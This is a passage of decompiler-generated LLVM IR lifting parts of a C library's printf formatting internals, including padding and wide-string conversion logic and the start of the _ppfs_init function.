  %v7_804aa02 = icmp ult i32 %v0_804aa02, %v1_804aa02
  %v12_804aa02 = icmp eq i32 %v2_804aa02, 0
  %v2_804aa04 = or i1 %v7_804aa02, %v12_804aa02
  br i1 %v2_804aa04, label %dec_label_pc_804aa0c, label %dec_label_pc_804aa06

dec_label_pc_804aa06:                             ; preds = %dec_label_pc_804a9f6
  store i32 %v2_804aa02, i32* %eax.global-to-local, align 4
  %v1_804aa08 = load i32, i32* @esp, align 4
  %v2_804aa08 = add i32 %v1_804aa08, 8
  %v3_804aa08 = inttoptr i32 %v2_804aa08 to i32*
  store i32 %v2_804aa02, i32* %v3_804aa08, align 4
  %v0_804aa10.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804aa0c

dec_label_pc_804aa0c:                             ; preds = %dec_label_pc_804a9f6, %dec_label_pc_804aa06
  %v0_804aa10 = phi i32 [ %v1_804aa02, %dec_label_pc_804a9f6 ], [ %v0_804aa10.pre, %dec_label_pc_804aa06 ]
  %v0_804aa0c = load i32, i32* @esp, align 4
  %v1_804aa0c = add i32 %v0_804aa0c, 8
  %v2_804aa0c = inttoptr i32 %v1_804aa0c to i32*
  %v3_804aa0c = load i32, i32* %v2_804aa0c, align 4
  store i32 %v3_804aa0c, i32* @ecx, align 4
  %v2_804aa10 = add i32 %v3_804aa0c, %v0_804aa10
  store i32 %v2_804aa10, i32* %eax.global-to-local, align 4
  %v1_804aa13 = inttoptr i32 %v0_804aa0c to i32*
  %v2_804aa13 = load i32, i32* %v1_804aa13, align 4
  %v4_804aa13 = add i32 %v2_804aa13, %v2_804aa10
  store i32 %v4_804aa13, i32* %v1_804aa13, align 4
  %v0_804aa16 = load i32, i32* @esp, align 4
  %v1_804aa16 = add i32 %v0_804aa16, 7
  %v2_804aa16 = inttoptr i32 %v1_804aa16 to i8*
  %v3_804aa16 = load i8, i8* %v2_804aa16, align 1
  %v9_804aa16 = icmp eq i8 %v3_804aa16, 48
  %v1_804aa1b = icmp eq i1 %v9_804aa16, false
  br i1 %v1_804aa1b, label %dec_label_pc_804aa27, label %dec_label_pc_804aa1d

dec_label_pc_804aa1d:                             ; preds = %dec_label_pc_804aa0c
  %v0_804aa1d = load i32, i32* @ebx, align 4
  %v1_804aa1d = load i32, i32* @ecx, align 4
  %v2_804aa1d = add i32 %v1_804aa1d, %v0_804aa1d
  store i32 %v2_804aa1d, i32* @ebx, align 4
  %v1_804aa1f = add i32 %v0_804aa16, 8
  %v2_804aa1f = inttoptr i32 %v1_804aa1f to i32*
  store i32 0, i32* %v2_804aa1f, align 4
  %v0_804aa27.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804aa27

dec_label_pc_804aa27:                             ; preds = %dec_label_pc_804aa0c, %dec_label_pc_804aa1d
  %v0_804aa2e = phi i32 [ %v0_804aa16, %dec_label_pc_804aa0c ], [ %v0_804aa27.pre, %dec_label_pc_804aa1d ]
  %v1_804aa27 = add i32 %v0_804aa2e, 32
  %v2_804aa27 = inttoptr i32 %v1_804aa27 to i8*
  %v3_804aa27 = load i8, i8* %v2_804aa27, align 1
  %v4_804aa27 = and i8 %v3_804aa27, 8
  %v5_804aa27 = icmp eq i8 %v4_804aa27, 0
  %v1_804aa2c = icmp eq i1 %v5_804aa27, false
  br i1 %v1_804aa2c, label %dec_label_pc_804aa55, label %dec_label_pc_804aa2e

dec_label_pc_804aa2e:                             ; preds = %dec_label_pc_804aa27
  %v1_804aa2e = add i32 %v0_804aa2e, 8
  %v2_804aa2e = inttoptr i32 %v1_804aa2e to i32*
  %v3_804aa2e = load i32, i32* %v2_804aa2e, align 4
  store i32 %v3_804aa2e, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804aa37 = add i32 %v0_804aa2e, 368
  %v2_804aa37 = inttoptr i32 %v1_804aa37 to i32*
  %v3_804aa37 = load i32, i32* %v2_804aa37, align 4
  store i32 %v3_804aa37, i32* @eax, align 4
  %v0_804aa3e = call i32 @_charpad()
  store i32 %v0_804aa3e, i32* %eax.global-to-local, align 4
  %v1_804aa43 = load i32, i32* @esp, align 4
  %v2_804aa43 = add i32 %v1_804aa43, 8
  %v3_804aa43 = inttoptr i32 %v2_804aa43 to i32*
  %v4_804aa43 = load i32, i32* %v3_804aa43, align 4
  %v15_804aa43 = icmp eq i32 %v0_804aa3e, %v4_804aa43
  %v1_804aa47 = icmp eq i1 %v15_804aa43, false
  br i1 %v1_804aa47, label %dec_label_pc_804ab43, label %dec_label_pc_804aa4d

dec_label_pc_804aa4d:                             ; preds = %dec_label_pc_804aa2e
  store i32 0, i32* %v3_804aa43, align 4
  %v1_804aa55.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804aa55

dec_label_pc_804aa55:                             ; preds = %dec_label_pc_804aa27, %dec_label_pc_804aa4d
  %v1_804aa55 = phi i32 [ %v0_804aa2e, %dec_label_pc_804aa27 ], [ %v1_804aa55.pre, %dec_label_pc_804aa4d ]
  %v0_804aa55 = load i32, i32* %eax.global-to-local, align 4
  %v2_804aa55 = add i32 %v1_804aa55, -4
  %v3_804aa55 = inttoptr i32 %v2_804aa55 to i32*
  store i32 %v0_804aa55, i32* %v3_804aa55, align 4
  %v0_804aa56 = load i32, i32* %eax.global-to-local, align 4
  %v2_804aa56 = add i32 %v1_804aa55, -8
  %v3_804aa56 = inttoptr i32 %v2_804aa56 to i32*
  store i32 %v0_804aa56, i32* %v3_804aa56, align 4
  %v1_804aa57 = add i32 %v1_804aa55, 368
  %v2_804aa57 = inttoptr i32 %v1_804aa57 to i32*
  %v3_804aa57 = load i32, i32* %v2_804aa57, align 4
  %v5_804aa57 = add i32 %v1_804aa55, -12
  %v6_804aa57 = inttoptr i32 %v5_804aa57 to i32*
  store i32 %v3_804aa57, i32* %v6_804aa57, align 4
  %v0_804aa5e = load i32, i32* @ebp, align 4
  %v1_804aa5e = add i32 %v0_804aa5e, ptrtoint (i32* @global_var_80515c5.322 to i32)
  store i32 %v1_804aa5e, i32* %eax.global-to-local, align 4
  %v2_804aa64 = add i32 %v1_804aa55, -16
  %v3_804aa64 = inttoptr i32 %v2_804aa64 to i32*
  store i32 %v1_804aa5e, i32* %v3_804aa64, align 4
  %v0_804aa65 = load i32, i32* %stack_var_-364, align 4
  %v4_804aa65 = inttoptr i32 %v0_804aa65 to i8*
  %v5_804aa65 = call i32 @__GI_fputs_unlocked(i8* %v4_804aa65, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804aa65, i32* %eax.global-to-local, align 4
  %v0_804aa6a = load i32, i32* @esp, align 4
  %v1_804aa6a = add i32 %v0_804aa6a, 384
  %v2_804aa6a = inttoptr i32 %v1_804aa6a to i32*
  %v3_804aa6a = load i32, i32* %v2_804aa6a, align 4
  store i32 %v3_804aa6a, i32* @eax, align 4
  %v0_804aa71 = load i32, i32* @ebx, align 4
  store i32 %v0_804aa71, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_804aa78 = call i32 @_charpad()
  store i32 %v0_804aa78, i32* %eax.global-to-local, align 4
  %v0_804aa7d = load i32, i32* @esp, align 4
  %v1_804aa7d = add i32 %v0_804aa7d, 16
  %v1_804aa80 = load i32, i32* @ebx, align 4
  %v12_804aa80 = icmp eq i32 %v0_804aa78, %v1_804aa80
  %v1_804aa82 = icmp eq i1 %v12_804aa80, false
  br i1 %v1_804aa82, label %dec_label_pc_804ab43, label %dec_label_pc_804aa88

dec_label_pc_804aa88:                             ; preds = %dec_label_pc_804aa55
  %v1_804aa88 = add i32 %v0_804aa7d, 356
  %v2_804aa88 = inttoptr i32 %v1_804aa88 to i32*
  %v3_804aa88 = load i32, i32* %v2_804aa88, align 4
  %v4_804aa88 = icmp eq i32 %v3_804aa88, 0
  %v1_804aa90 = icmp eq i1 %v4_804aa88, false
  br i1 %v1_804aa90, label %dec_label_pc_804aab4, label %dec_label_pc_804aa92

dec_label_pc_804aa92:                             ; preds = %dec_label_pc_804aa88
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804aa94 = load i32, i32* @esi, align 4
  %v1_804aa94 = icmp eq i32 %v0_804aa94, 0
  br i1 %v1_804aa94, label %dec_label_pc_804aaaa.thread, label %dec_label_pc_804aaaa

dec_label_pc_804aaaa.thread:                      ; preds = %dec_label_pc_804aa92
  br label %dec_label_pc_804ab15

dec_label_pc_804aaaa:                             ; preds = %dec_label_pc_804aa92
  %v2_804aa98 = add i32 %v0_804aa7d, 12
  %v3_804aa98 = inttoptr i32 %v2_804aa98 to i32*
  store i32 0, i32* %v3_804aa98, align 4
  %v1_804aa99 = add i32 %v0_804aa7d, 384
  %v2_804aa99 = inttoptr i32 %v1_804aa99 to i32*
  %v3_804aa99 = load i32, i32* %v2_804aa99, align 4
  %v5_804aa99 = add i32 %v0_804aa7d, 8
  %v6_804aa99 = inttoptr i32 %v5_804aa99 to i32*
  store i32 %v3_804aa99, i32* %v6_804aa99, align 4
  %v0_804aaa0 = load i32, i32* @esi, align 4
  %v2_804aaa0 = add i32 %v0_804aa7d, 4
  %v3_804aaa0 = inttoptr i32 %v2_804aaa0 to i32*
  store i32 %v0_804aaa0, i32* %v3_804aaa0, align 4
  %v0_804aaa1 = load i32, i32* @edi, align 4
  %v3_804aaa1 = inttoptr i32 %v0_804aa7d to i32*
  store i32 %v0_804aaa1, i32* %v3_804aaa1, align 4
  %v0_804aaa2 = load i32, i32* %stack_var_-364, align 4
  %v4_804aaa2 = call i32 @__stdio_fwrite(i32 %v0_804aaa2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804aaa2, i32* %eax.global-to-local, align 4
  %v0_804aaa7 = load i32, i32* @esp, align 4
  %v1_804aaa7 = add i32 %v0_804aaa7, 16
  %v1_804aaaa.pre = load i32, i32* @esi, align 4
  %v12_804aaaa = icmp eq i32 %v4_804aaa2, %v1_804aaaa.pre
  %v1_804aaac = icmp eq i1 %v12_804aaaa, false
  br i1 %v1_804aaac, label %dec_label_pc_804ab43, label %dec_label_pc_804ab15

dec_label_pc_804aab4:                             ; preds = %dec_label_pc_804aa88
  %v1_804aab4 = add i32 %v0_804aa7d, 348
  %v2_804aab4 = inttoptr i32 %v1_804aab4 to i32*
  store i32 0, i32* %v2_804aab4, align 4
  %v0_804ab117 = load i32, i32* @esi, align 4
  %v1_804ab118 = icmp eq i32 %v0_804ab117, 0
  %v1_804ab1315 = icmp eq i1 %v1_804ab118, false
  br i1 %v1_804ab1315, label %dec_label_pc_804aac1, label %dec_label_pc_804aab4.dec_label_pc_804ab15.loopexit_crit_edge

dec_label_pc_804aab4.dec_label_pc_804ab15.loopexit_crit_edge: ; preds = %dec_label_pc_804aab4
  %v0_804ab15.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ab15

dec_label_pc_804aac1:                             ; preds = %dec_label_pc_804aab4, %dec_label_pc_804ab0f
  %v0_804aac1 = phi i32 [ %v2_804ab0f, %dec_label_pc_804ab0f ], [ %v0_804ab117, %dec_label_pc_804aab4 ]
  %tmp102 = icmp ult i32 %v0_804aac1, 129
  br i1 %tmp102, label %dec_label_pc_804aad0, label %dec_label_pc_804aacb

dec_label_pc_804aacb:                             ; preds = %dec_label_pc_804aac1
  br label %dec_label_pc_804aad0

dec_label_pc_804aad0:                             ; preds = %dec_label_pc_804aac1, %dec_label_pc_804aacb
  %storemerge103 = phi i32 [ 128, %dec_label_pc_804aacb ], [ %v0_804aac1, %dec_label_pc_804aac1 ]
  store i32 %storemerge103, i32* %edx.global-to-local, align 4
  %v0_804aad0 = load i32, i32* @esp, align 4
  %v1_804aad0 = add i32 %v0_804aad0, 332
  %v2_804aad7 = add i32 %v0_804aad0, -4
  %v3_804aad7 = inttoptr i32 %v2_804aad7 to i32*
  store i32 %v1_804aad0, i32* %v3_804aad7, align 4
  %v0_804aad8 = load i32, i32* %edx.global-to-local, align 4
  %v2_804aad8 = add i32 %v0_804aad0, -8
  %v3_804aad8 = inttoptr i32 %v2_804aad8 to i32*
  store i32 %v0_804aad8, i32* %v3_804aad8, align 4
  %v1_804aad9 = add i32 %v0_804aad0, 340
  store i32 %v1_804aad9, i32* %eax.global-to-local, align 4
  %v2_804aae0 = add i32 %v0_804aad0, -12
  %v3_804aae0 = inttoptr i32 %v2_804aae0 to i32*
  store i32 %v1_804aad9, i32* %v3_804aae0, align 4
  %v1_804aae1 = add i32 %v0_804aad0, 204
  store i32 %v1_804aae1, i32* @edi, align 4
  %v2_804aae8 = add i32 %v0_804aad0, -16
  %v3_804aae8 = inttoptr i32 %v2_804aae8 to i32*
  store i32 %v1_804aae1, i32* %v3_804aae8, align 4
  %v0_804aae9 = call i32 @__GI_wcsrtombs()
  store i32 %v0_804aae9, i32* @ebx, align 4
  %v0_804aaf0 = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804aaf5 = icmp eq i32 %v0_804aae9, 0
  br i1 %v1_804aaf5, label %dec_label_pc_804ab0b, label %dec_label_pc_804aaf9

dec_label_pc_804aaf9:                             ; preds = %dec_label_pc_804aad0
  %v0_804aaf9 = load i32, i32* @ebp, align 4
  %v2_804aaf9 = add i32 %v0_804aaf0, 12
  %v3_804aaf9 = inttoptr i32 %v2_804aaf9 to i32*
  store i32 %v0_804aaf9, i32* %v3_804aaf9, align 4
  %v1_804aafa = add i32 %v0_804aaf0, 384
  %v2_804aafa = inttoptr i32 %v1_804aafa to i32*
  %v3_804aafa = load i32, i32* %v2_804aafa, align 4
  %v5_804aafa = add i32 %v0_804aaf0, 8
  %v6_804aafa = inttoptr i32 %v5_804aafa to i32*
  store i32 %v3_804aafa, i32* %v6_804aafa, align 4
  %v2_804ab01 = add i32 %v0_804aaf0, 4
  %v3_804ab01 = inttoptr i32 %v2_804ab01 to i32*
  store i32 %v0_804aae9, i32* %v3_804ab01, align 4
  %v0_804ab02 = load i32, i32* @edi, align 4
  %v3_804ab02 = inttoptr i32 %v0_804aaf0 to i32*
  store i32 %v0_804ab02, i32* %v3_804ab02, align 4
  %v0_804ab03 = load i32, i32* %stack_var_-364, align 4
  %v4_804ab03 = call i32 @__stdio_fwrite(i32 %v0_804ab03, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804ab03, i32* %eax.global-to-local, align 4
  %v0_804ab08 = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ab0b

dec_label_pc_804ab0b:                             ; preds = %dec_label_pc_804aad0, %dec_label_pc_804aaf9
  %v0_804ab4349.in = phi i32 [ %v0_804aaf0, %dec_label_pc_804aad0 ], [ %v0_804ab08, %dec_label_pc_804aaf9 ]
  %v1_804ab0f = phi i32 [ 0, %dec_label_pc_804aad0 ], [ %v4_804ab03, %dec_label_pc_804aaf9 ]
  %v0_804ab4349 = add i32 %v0_804ab4349.in, 16
  %v12_804ab0b = icmp eq i32 %v1_804ab0f, %v0_804aae9
  %v1_804ab0d = icmp eq i1 %v12_804ab0b, false
  br i1 %v1_804ab0d, label %dec_label_pc_804ab43, label %dec_label_pc_804ab0f

dec_label_pc_804ab0f:                             ; preds = %dec_label_pc_804ab0b
  %v0_804ab0f = load i32, i32* @esi, align 4
  %v2_804ab0f = sub i32 %v0_804ab0f, %v1_804ab0f
  %v12_804ab0f = icmp eq i32 %v2_804ab0f, 0
  store i32 %v2_804ab0f, i32* @esi, align 4
  %v1_804ab13 = icmp eq i1 %v12_804ab0f, false
  br i1 %v1_804ab13, label %dec_label_pc_804aac1, label %dec_label_pc_804ab15

dec_label_pc_804ab15:                             ; preds = %dec_label_pc_804ab0f, %dec_label_pc_804aaaa.thread, %dec_label_pc_804aab4.dec_label_pc_804ab15.loopexit_crit_edge, %dec_label_pc_804aaaa
  %v0_804ab15 = phi i32 [ %v1_804aaa7, %dec_label_pc_804aaaa ], [ %v0_804ab15.pre.pre, %dec_label_pc_804aab4.dec_label_pc_804ab15.loopexit_crit_edge ], [ %v1_804aa7d, %dec_label_pc_804aaaa.thread ], [ %v0_804ab4349, %dec_label_pc_804ab0f ]
  %v1_804ab15 = add i32 %v0_804ab15, 8
  %v2_804ab15 = inttoptr i32 %v1_804ab15 to i32*
  %v3_804ab15 = load i32, i32* %v2_804ab15, align 4
  store i32 %v3_804ab15, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804ab1e = add i32 %v0_804ab15, 368
  %v2_804ab1e = inttoptr i32 %v1_804ab1e to i32*
  %v3_804ab1e = load i32, i32* %v2_804ab1e, align 4
  store i32 %v3_804ab1e, i32* @eax, align 4
  %v0_804ab25 = call i32 @_charpad()
  store i32 %v0_804ab25, i32* %eax.global-to-local, align 4
  %v1_804ab2a = load i32, i32* @esp, align 4
  %v2_804ab2a = add i32 %v1_804ab2a, 8
  %v3_804ab2a = inttoptr i32 %v2_804ab2a to i32*
  %v4_804ab2a = load i32, i32* %v3_804ab2a, align 4
  %v15_804ab2a = icmp eq i32 %v0_804ab25, %v4_804ab2a
  %v1_804ab2e = icmp eq i1 %v15_804ab2a, false
  br i1 %v1_804ab2e, label %dec_label_pc_804ab43, label %dec_label_pc_804ab30

dec_label_pc_804ab30:                             ; preds = %dec_label_pc_804ab15, %dec_label_pc_804a8aa, %dec_label_pc_804a6d8
  %v0_804ab30 = phi i32 [ %v1_804ab2a, %dec_label_pc_804ab15 ], [ %v0_804ab30.pre, %dec_label_pc_804a8aa ], [ %v1_804a6f6, %dec_label_pc_804a6d8 ]
  %v1_804ab30 = add i32 %v0_804ab30, 16
  %v2_804ab30 = inttoptr i32 %v1_804ab30 to i32*
  %v3_804ab30 = load i32, i32* %v2_804ab30, align 4
  store i32 %v3_804ab30, i32* @ebx, align 4
  store i32 %v3_804ab30, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804a630.backedge

dec_label_pc_804ab3b:                             ; preds = %dec_label_pc_804a66e
  %v1_804ab3b = add i32 %v0_804ab3b, 2
  store i32 %v1_804ab3b, i32* @ebx, align 4
  br label %dec_label_pc_804a630.backedge

dec_label_pc_804ab43:                             ; preds = %dec_label_pc_804a65a, %dec_label_pc_804ab15, %dec_label_pc_804aaaa, %dec_label_pc_804aa55, %dec_label_pc_804aa2e, %dec_label_pc_804a99e, %dec_label_pc_804a919, %dec_label_pc_804a8ed, %dec_label_pc_804a881, %dec_label_pc_804ab0b
  %v0_804ab43 = phi i32 [ %v0_804ab4349, %dec_label_pc_804ab0b ], [ %v0_804ab43.pre.pre, %dec_label_pc_804a65a ], [ %v1_804ab2a, %dec_label_pc_804ab15 ], [ %v1_804aaa7, %dec_label_pc_804aaaa ], [ %v1_804aa7d, %dec_label_pc_804aa55 ], [ %v1_804aa43, %dec_label_pc_804aa2e ], [ %v0_804a6d0.lcssa, %dec_label_pc_804a99e ], [ %v1_804a931, %dec_label_pc_804a919 ], [ %v1_804a904, %dec_label_pc_804a8ed ], [ %v1_804a89f, %dec_label_pc_804a881 ]
  %v1_804ab43 = inttoptr i32 %v0_804ab43 to i32*
  store i32 -1, i32* %v1_804ab43, align 4
  br label %dec_label_pc_804ab4a

dec_label_pc_804ab4a:                             ; preds = %dec_label_pc_804a665, %dec_label_pc_804a5d3, %dec_label_pc_804a5f2, %dec_label_pc_804ab43
  %v0_804ab4a = load i32, i32* @esp, align 4
  %v1_804ab4a = inttoptr i32 %v0_804ab4a to i32*
  %v2_804ab4a = load i32, i32* %v1_804ab4a, align 4
  store i32 %v2_804ab4a, i32* %eax.global-to-local, align 4
  %v1_804ab4d = add i32 %v0_804ab4a, 348
  %v1_804ab53 = inttoptr i32 %v1_804ab4d to i32*
  %v2_804ab53 = load i32, i32* %v1_804ab53, align 4
  store i32 %v2_804ab53, i32* @ebx, align 4
  ret i32 %v2_804ab4a

; uselistorder directives
  uselistorder i32 %v1_804ab3b, { 1, 0 }
  uselistorder i32 %v3_804ab30, { 2, 3, 0, 1 }
  uselistorder i32 %v0_804ab15, { 1, 0 }
  uselistorder i32 %v2_804ab0f, { 1, 2, 0 }
  uselistorder i32 %v0_804ab4349, { 1, 0 }
  uselistorder i32 %v1_804ab0f, { 1, 0 }
  uselistorder i32 %v0_804aaf0, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v0_804aae9, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804aa7d, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v1_804aa55, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804aa2e, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804aa02, { 1, 0, 2 }
  uselistorder i32 %v6_804a9ef, { 1, 0 }
  uselistorder i32 %v1_804a9ec, { 1, 0 }
  uselistorder i32 %v0_804a9e5, { 0, 3, 2, 1 }
  uselistorder i32 %v1_804a96f, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_804a97f, { 2, 3, 1, 0 }
  uselistorder i32 %v0_804a8e0, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v0_804a8c6, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v0_804a85f, { 1, 0, 2 }
  uselistorder i32 %v1_804a7e3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v0_804a836, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_804a7bf, { 0, 1, 3, 2 }
  uselistorder i32 %v1_804a778, { 1, 0 }
  uselistorder i32 %v1_804a785, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v3_804a6d0, { 3, 12, 10, 5, 4, 7, 6, 8, 13, 0, 1, 2, 11, 9, 14, 15 }
  uselistorder i32 %v0_804a6d0.lcssa, { 0, 8, 7, 6, 9, 24, 23, 12, 13, 14, 15, 16, 17, 11, 10, 19, 18, 22, 21, 20, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_804a6cc, { 1, 0 }
  uselistorder i32 %v1_804a6cc.pre, { 1, 0 }
  uselistorder i32 %v1_804a6cb, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v1_804a6c8, { 1, 0 }
  uselistorder i32 %v2_804a6cc80, { 1, 0 }
  uselistorder i32 %v3_804a6b2, { 1, 0 }
  uselistorder i32 %v1_804a66e, { 0, 2, 3, 1 }
  uselistorder i32 %v2_804a63a, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804a63e, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804a628, { 1, 0, 2 }
  uselistorder i32* %stack_var_-348, { 1, 0, 2 }
  uselistorder i32* %stack_var_-364, { 2, 1, 4, 5, 0, 7, 6, 3, 8, 9, 10 }
  uselistorder i32* %edx.global-to-local, { 2, 3, 0, 4, 26, 5, 1, 6, 10, 7, 8, 9, 11, 12, 13, 14, 16, 15, 19, 18, 20, 21, 27, 22, 23, 24, 28, 25, 29, 31, 30, 17 }
  uselistorder i32* %ecx.global-to-local, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 10, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 57, 36, 56, 37, 38, 39, 40 }
  uselistorder i32 348, { 1, 0 }
  uselistorder i32 ()* @_charpad, { 2, 1, 0, 3 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 332, { 1, 0, 2, 3 }
  uselistorder i32 204, { 2, 0, 3, 1, 4 }
  uselistorder i32 344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 368, { 3, 1, 4, 0, 2 }
  uselistorder label %dec_label_pc_804ab4a, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804ab43, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_804ab15, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804ab0b, { 1, 0 }
  uselistorder label %dec_label_pc_804aad0, { 1, 0 }
  uselistorder label %dec_label_pc_804aac1, { 1, 0 }
  uselistorder label %dec_label_pc_804aa55, { 1, 0 }
  uselistorder label %dec_label_pc_804aa27, { 1, 0 }
  uselistorder label %dec_label_pc_804aa0c, { 1, 0 }
  uselistorder label %dec_label_pc_804a9f6, { 1, 0 }
  uselistorder label %dec_label_pc_804a9e2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804a9d6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804a96f, { 1, 0 }
  uselistorder label %dec_label_pc_804a962, { 1, 0 }
  uselistorder label %dec_label_pc_804a8ed, { 1, 0 }
  uselistorder label %dec_label_pc_804a881, { 1, 0 }
  uselistorder label %dec_label_pc_804a836, { 1, 0 }
  uselistorder label %dec_label_pc_804a827, { 6, 2, 1, 3, 5, 0, 4 }
  uselistorder label %dec_label_pc_804a7ed, { 1, 0 }
  uselistorder label %dec_label_pc_804a7d4, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804a785, { 1, 0 }
  uselistorder label %dec_label_pc_804a76c, { 1, 0 }
  uselistorder label %dec_label_pc_804a758, { 1, 0 }
  uselistorder label %dec_label_pc_804a753, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804a734, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804a6c1, { 1, 0 }
  uselistorder label %dec_label_pc_804a6b9, { 1, 0 }
  uselistorder label %dec_label_pc_804a665, { 1, 0 }
  uselistorder label %dec_label_pc_804a65a, { 1, 0 }
  uselistorder label %dec_label_pc_804a630.backedge, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804ab58 = load i32, i32* @esi, align 4
  %v0_804ab59 = load i32, i32* @ebx, align 4
  store i32 %v0_804ab59, i32* %stack_var_-8, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v3_804ab6d = bitcast i32* %arg1 to i8*
  %v4_804ab6d = call i32 @__GI_memset(i8* %v3_804ab6d, i32 0, i32 188)
  store i32 %v4_804ab6d, i32* %eax.global-to-local, align 4
  %v0_804ab72 = load i32, i32* @ebx, align 4
  %v1_804ab72 = add i32 %v0_804ab72, 24
  %v2_804ab72 = inttoptr i32 %v1_804ab72 to i32*
  %v3_804ab72 = load i32, i32* %v2_804ab72, align 4
  %v4_804ab72 = add i32 %v3_804ab72, -1
  store i32 %v4_804ab72, i32* %v2_804ab72, align 4
  %v0_804ab75 = load i32, i32* @esi, align 4
  %v1_804ab75 = load i32, i32* @ebx, align 4
  %v2_804ab75 = inttoptr i32 %v1_804ab75 to i32*
  store i32 %v0_804ab75, i32* %v2_804ab75, align 4
  %v0_804ab77 = load i32, i32* @ebx, align 4
  %v1_804ab77 = add i32 %v0_804ab77, 40
  store i32 %v1_804ab77, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ab82

dec_label_pc_804ab82:                             ; preds = %dec_label_pc_804ab82, %entry
  %v0_804ab82 = phi i32 [ %v1_804ab88, %dec_label_pc_804ab82 ], [ %v1_804ab77, %entry ]
  %v1_804ab82 = inttoptr i32 %v0_804ab82 to i32*
  store i32 8, i32* %v1_804ab82, align 4
  %v0_804ab88 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ab88 = add i32 %v0_804ab88, 4
  store i32 %v1_804ab88, i32* %eax.global-to-local, align 4
  %v0_804ab8b = load i32, i32* %edx.global-to-local, align 4
  %v1_804ab8b = add i32 %v0_804ab8b, -1
  %v8_804ab8b = icmp eq i32 %v1_804ab8b, 0
  store i32 %v1_804ab8b, i32* %edx.global-to-local, align 4
  %v1_804ab8c = icmp eq i1 %v8_804ab8b, false
  br i1 %v1_804ab8c, label %dec_label_pc_804ab82, label %dec_label_pc_804ab8e

dec_label_pc_804ab8e:                             ; preds = %dec_label_pc_804ab82
  %v0_804ab8e = load i32, i32* @esi, align 4
  store i32 %v0_804ab8e, i32* %eax.global-to-local, align 4
  %v1_804abb920 = inttoptr i32 %v0_804ab8e to i8*
  %v2_804abb921 = load i8, i8* %v1_804abb920, align 1
  %v3_804abb922 = zext i8 %v2_804abb921 to i32
  %v5_804abb923 = and i32 %v1_804ab8b, -256
  %v6_804abb924 = or i32 %v3_804abb922, %v5_804abb923
  store i32 %v6_804abb924, i32* %edx.global-to-local, align 4
  %v4_804abbb25 = icmp eq i8 %v2_804abb921, 0
  %v1_804abbd26 = icmp eq i1 %v4_804abbb25, false
  br i1 %v1_804abbd26, label %dec_label_pc_804ab97, label %dec_label_pc_804abbf

dec_label_pc_804ab97:                             ; preds = %dec_label_pc_804ab8e, %dec_label_pc_804abb9.backedge
  %v6_804abb929 = phi i32 [ %v6_804abb9, %dec_label_pc_804abb9.backedge ], [ %v6_804abb924, %dec_label_pc_804ab8e ]
  %v2_804abb928 = phi i8 [ %v2_804abb9, %dec_label_pc_804abb9.backedge ], [ %v2_804abb921, %dec_label_pc_804ab8e ]
  %v0_804ab9c27 = phi i32 [ %v0_804ab9c.be, %dec_label_pc_804abb9.backedge ], [ %v0_804ab8e, %dec_label_pc_804ab8e ]
  %v10_804ab97 = icmp eq i8 %v2_804abb928, 37
  %v1_804ab9a = icmp eq i1 %v10_804ab97, false
